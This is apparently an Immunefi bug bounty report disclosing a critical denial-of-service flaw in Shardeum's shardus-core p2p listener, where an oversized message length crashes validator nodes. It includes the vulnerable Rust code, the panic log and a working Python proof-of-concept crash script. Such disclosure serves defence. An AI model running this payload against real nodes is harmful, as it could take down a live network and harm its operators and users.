# 33428 - \[BC - Critical] Validators can be crashed via pp

Submitted on Jul 20th 2024 at 11:29:33 UTC by @usmannk for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33428

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

An attacker can cause a rust panic via p2p, crashing arbitrary nodes on the network. Repeating this simple process takes down the network.

This is a fatal error and pm2 does not recover from it.

## Vulnerability Details

The shardus net listener does the following on new connections:

```rust
async fn receive(socket_stream: TcpStream, remote_addr: SocketAddr, received_msg_tx: UnboundedSender<(String, SocketAddr, Option<RequestMetadata>)>) -> ListenerResult<()> {
  let mut socket_stream: TcpStream = socket_stream;
  while let Ok(msg_len) = socket_stream.read_u32().await {
      let mut buffer: Vec<u8> = vec![0; msg_len as usize];
```

If an attacker sends a byte that decodes to a value larger than `(2**29)-24`, this vec will be allocated to that size and passed to the JS runtime via Neon as a string and cause the following panic:

```
11|"shardus-instance-9009"  | thread '<unnamed>' panicked at /Users/usmannkhan/.cargo/registry/src/index.crates.io-6f17d22bba15001f/neon-0.10.1/src/types/mod.rs:509:36:
11|"shardus-instance-9009"  | called `Result::unwrap()` on an `Err` value: StringOverflow(536870889)
11|"shardus-instance-9009"  | note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
11|"shardus-instance-9009"  | [Error: A panic occurred while executing a `neon::event::Channel::send` callback] {
11|"shardus-instance-9009"  |   panic: [Error: called `Result::unwrap()` on an `Err` value: StringOverflow(536870889)]
```

## Impact Details

Total network shutdown.

## Reference

See <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\\_Objects/String/length#description> for more info on max string length.

## Proof of Concept

The following python script will crash a node running at `127.0.0.1:10009`:

```python
import socket
def connect(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', port))
    return s
MAX_STR_LEN = 2**29 - 24
s = connect(10009)
val = bytes.fromhex(hex(MAX_STR_LEN + 1)[2:])
s.send(val)
s.close()
```
